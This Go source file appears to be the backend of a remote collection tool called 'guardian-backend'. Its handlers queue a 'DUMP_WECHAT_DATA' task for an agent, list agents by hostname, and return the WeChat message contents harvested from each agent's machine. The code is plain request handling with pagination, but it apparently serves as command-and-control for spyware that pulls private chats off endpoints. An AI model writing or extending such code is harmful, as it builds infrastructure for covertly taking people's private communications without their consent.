package handler

import (
    "context"
    "errors"
    "log/slog"
    "net/http"
    "strconv"

    "guardian-backend/internal/database"
    "guardian-backend/pkg/httpx"
)

type TaskHandler struct {
    DB interface {
        database.DBOperations
        ListAgents(ctx context.Context) ([]database.AgentInfo, error)
        ListMessagesByAgent(ctx context.Context, agentID int) ([]database.WechatMessageRecord, error)
    }
}

func (h *TaskHandler) Create(w http.ResponseWriter, r *http.Request) {
	agentID, ok := r.Context().Value(AgentIDKey).(int)
	if !ok {
		slog.Error("Could not retrieve agentID from context")
        httpx.WriteError(w, r, http.StatusInternalServerError, "INTERNAL_ERROR", "agent id missing in context")
		return
	}
	taskType := "DUMP_WECHAT_DATA"
	err := h.DB.CreateTaskForAgent(r.Context(), agentID, taskType)
	if err != nil {
		if errors.Is(err, database.ErrAgentNotFound) {
            httpx.WriteError(w, r, http.StatusNotFound, "NOT_FOUND", "agent not found")
		} else {
			slog.Error("Failed to create task", "error", err, "agent_id", agentID)
            httpx.WriteError(w, r, http.StatusInternalServerError, "INTERNAL_ERROR", "failed to create task")
		}
		return
	}
    httpx.WriteJSON(w, http.StatusCreated, map[string]string{"status": "task created"})
}

// Agents 列表查询
func (h *TaskHandler) Agents(w http.ResponseWriter, r *http.Request) {
    // 简单分页：?page=1&page_size=50
    q := r.URL.Query()
    page, _ := strconv.Atoi(q.Get("page"))
    size, _ := strconv.Atoi(q.Get("page_size"))
    if page <= 0 { page = 1 }
    if size <= 0 || size > 200 { size = 50 }

    list, err := h.DB.ListAgents(r.Context())
    if err != nil {
        slog.Error("Failed to list agents", "error", err)
        httpx.WriteError(w, r, http.StatusInternalServerError, "INTERNAL_ERROR", "failed to list agents")
        return
    }
    type agentDTO struct{ ID int `json:"id"`; Name string `json:"name"` }
    out := make([]agentDTO, 0, len(list))
    for _, a := range list {
        out = append(out, agentDTO{ID: a.ID, Name: a.Hostname})
    }
    // 服务器端简单截断
    start := (page-1)*size
    if start > len(out) { start = len(out) }
    end := start + size
    if end > len(out) { end = len(out) }

    httpx.WriteJSON(w, http.StatusOK, out[start:end])
}

// MessagesByAgent 查询某 Agent 的消息
func (h *TaskHandler) MessagesByAgent(w http.ResponseWriter, r *http.Request) {
    agentID, ok := r.Context().Value(AgentIDKey).(int)
    if !ok {
        slog.Error("Could not retrieve agentID from context")
        http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
        return
    }
    // 简单分页：?page=1&page_size=100
    q := r.URL.Query()
    page, _ := strconv.Atoi(q.Get("page"))
    size, _ := strconv.Atoi(q.Get("page_size"))
    if page <= 0 { page = 1 }
    if size <= 0 || size > 500 { size = 100 }

    recs, err := h.DB.ListMessagesByAgent(r.Context(), agentID)
    if err != nil {
        slog.Error("Failed to list messages", "error", err, "agent_id", agentID)
        httpx.WriteError(w, r, http.StatusInternalServerError, "INTERNAL_ERROR", "failed to list messages")
        return
    }
    type msgDTO struct{ Content string `json:"content"`; Timestamp int64 `json:"timestamp"` }
    out := make([]msgDTO, 0, len(recs))
    for _, m := range recs {
        out = append(out, msgDTO{Content: m.Content, Timestamp: m.Timestamp.UnixMilli()})
    }
    start := (page-1)*size
    if start > len(out) { start = len(out) }
    end := start + size
    if end > len(out) { end = len(out) }

    httpx.WriteJSON(w, http.StatusOK, out[start:end])
}
